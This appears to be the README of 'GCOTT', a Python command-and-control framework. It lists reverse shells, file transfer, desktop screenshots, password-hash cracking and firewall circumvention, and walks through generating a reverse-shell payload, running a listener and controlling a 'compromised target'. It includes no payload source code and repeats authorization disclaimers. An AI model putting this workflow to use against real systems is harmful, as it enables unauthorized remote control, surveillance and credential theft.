# 🔱 GCOTT - Get Control Of The Target 🔱 

[![License: MIT](https://img.shields.io/badge/License-MIT-cyan.svg)](https://opensource.org/licenses/MIT)
[![Python: 3.12+](https://img.shields.io/badge/Python-3.12+-blueviolet.svg)](https://www.python.org/downloads/)
[![Maintenance: Active](https://img.shields.io/badge/Maintenance-Active-success.svg)](https://github.com/yourusername/GCOTT)
[![OS](https://img.shields.io/badge/OS-Linux%20%7C%20Windows%20%7C%20macOS-orange.svg)]()



---
**GCOTT** (pronounced "jee-cott")
stands as a meticulously crafted command and control (C2) framework, engineered for the discerning security professional and the adept system administrator. This potent tool empowers authorized entities to forge secure conduits to remote systems, enabling the seamless execution of commands, the efficient transfer of digital assets, and the comprehensive management of target environments. **A solemn reminder: Employ this instrument only when explicit authorization has been granted. Unauthorized usage is strictly forbidden and carries legal ramifications.**

---

## 🛡️ Important Legal Notice 🛡️

**This software is provided solely for the purpose of ethical security assessments and legitimate system administration tasks. The developers and contributors disclaim any liability for its misuse or any damages it may cause. Ensure that you possess unequivocal authorization before deploying GCOTT on any system.**

---

## ✨ Key Features ✨

GCOTT boasts an array of sophisticated functionalities, including:

* **🎯 Interactive Command Console:** Unleash shell commands on the target system and witness real-time output, providing immediate insights and control.
* **📁 Effortless File Interchange:** Seamlessly upload and download critical files between your command center and the remote target.
* **🗂️ Intelligent Directory Navigation:** Explore, list, and traverse directories on the target's file system with intuitive commands.
* **🧠 Comprehensive System Intelligence:** Gather vital statistics about the target's operating system and user context.
* **🖥️ Visual Surveillance:** Capture and retrieve desktop snapshots from the target machine, offering a visual perspective of the environment.
* **💻 Immersive Shell Sessions:** Establish a fully interactive shell on the target, granting direct command-line access.
* **🛠️ Bespoke Payload Generation:** Craft custom Python payloads, tailoring the connection parameters with configurable host IP and port.
* **🔓 Robust Password Decryption Suite:** An integrated module designed to attempt the cracking of hashed passwords using a variety of algorithms and extensive wordlists.
* **🚪 Strategic Firewall Circumvention (Experimental):** Attempts to dynamically configure firewall rules to facilitate outbound communication pathways.
* **🎨 Elegant Command-Line Interface:** A user-friendly interface adorned with informative prompts and vibrant color-coded output.
* **🧩 Modular and Extensible Architecture:** A thoughtfully structured codebase, promoting ease of understanding and future enhancements.
---
## 🛠️ Installation Guide 🛠️

1.  **Acquire the Source Code:**
    ```bash
    git clone [repository URL]
    cd GCOTT
    ```

2.  **Verify Python Environment:**
    Ensure your system is equipped with Python 3.x:
    ```bash
    python3 --version
    ```

3.  **Install Dependencies:**
    Install the necessary libraries to unlock GCOTT's full potential:
    ```bash
    pip3 install -r requirements.txt
    ```
    *(Note: If a `requirements.txt` file is not present, you might need to manually install dependencies such as `art`, `termcolor`, and `pyautogui`.)*
---
## 🚀 Getting Started 🚀

GCOTT operates on a client-server model, comprising the **listener** (your attack platform) and the **payload** (deployed on the target).

### 1. Crafting the Payload (Attacker's Domain)

1.  Initiate the GCOTT framework:
    ```bash
    python3 gcott.py
    ```

2.  Navigate to the payload generation module:
    ```
    GCOTT -> generate
    ```

3.  Explore the available payload options:
    ```
    GCOTT@Payload -> list
    ```

4.  Select and configure your desired payload (e.g., a reverse shell connection):
    ```
    GCOTT@Payload -> set reverseShell.py
    GCOTT@reverseShell -> set host_ip [your_listening_ip]
    GCOTT@reverseShell -> set host_port [your_listening_port]
    ```
    Replace `[your_listening_ip]` with the network address of your attacking machine and `[your_listening_port]` with the designated port for the incoming connection (e.g., `5555`).

5.  Generate the executable payload file:
    ```
    GCOTT@reverseShell -> generate
    ```
    This action will produce a `payload.py` file within the GCOTT directory.
---
### 2. Establishing the Listener (Attacker's Command Center)

1.  Launch the GCOTT framework:
    ```bash
    python3 gcott.py
    ```

2.  Engage the listening mode:
    ```
    GCOTT -> listen
    ```

3.  Review or adjust the listening IP address and port (defaults to your machine's primary IP and port 5555):
    ```
    GCOTT@Listen -> show
    GCOTT@Listen -> set host_ip [your_listening_ip]
    GCOTT@Listen -> set host_port [your_listening_port]
    ```

4.  Activate the listener:
    ```
    GCOTT@Listen -> execute
    ```
    The listener will now stand vigilant, awaiting incoming connections from target systems.
---
### 3. Deploying the Payload (Target System)

1.  Transfer the generated `payload.py` file to the intended target machine through an authorized and secure method (e.g., encrypted file transfer, physical media).

2.  Execute the payload on the target system using the Python interpreter:
    ```bash
    python3 payload.py
    ```
    *(Note: The precise execution command might vary depending on the specific payload.)*
---
### 4. Interacting with the Compromised Target (Attacker's Control)

Upon successful execution of the payload, a connection will be forged with your listener. The GCOTT prompt will then display the target's IP address:
```
[target_ip]@GCOTT->
```
You can now leverage a suite of commands to interact with the target system. Employ the `help` or `-h` command to unveil the available options within the listening mode.
```
[target_ip]@GCOTT-> help
```
---
### Password Cracking Module

1.  Initiate the GCOTT framework:
    ```bash
    python3 gcott.py
    ```

2.  Access the password cracking module:
    ```
    GCOTT -> password
    ```

3.  Follow the interactive prompts to input the hashed password, the path to your password list, the hashing algorithm used, and your preferred randomness setting.
---
## 📂 Payloads Repository 📂

The `payloads` directory houses a collection of illustrative Python scripts that serve as payload examples. Feel free to contribute your own custom payloads to this repository, expanding GCOTT's capabilities.

---
## 🤝 Contributing 🤝

Contributions to GCOTT are highly valued. We encourage you to submit pull requests addressing bug fixes, introducing novel features, or enhancing the existing codebase.

---
## 📜 License 📜

This project operates under the terms of the MIT License.

---
## 🙏 Acknowledgements 🙏

* The `art` library for its artistic ASCII banner generation.
* The `termcolor` library for its vibrant terminal output coloring.
* The `pyautogui` library for its cross-platform GUI automation capabilities (powering the screenshot functionality).

---
**A final, crucial reminder: Employ this powerful tool with the utmost responsibility and within ethical boundaries, ensuring explicit authorization at all times.**

[⬆️ Go Top](#-gcott---advanced-remote-administration-framework--)
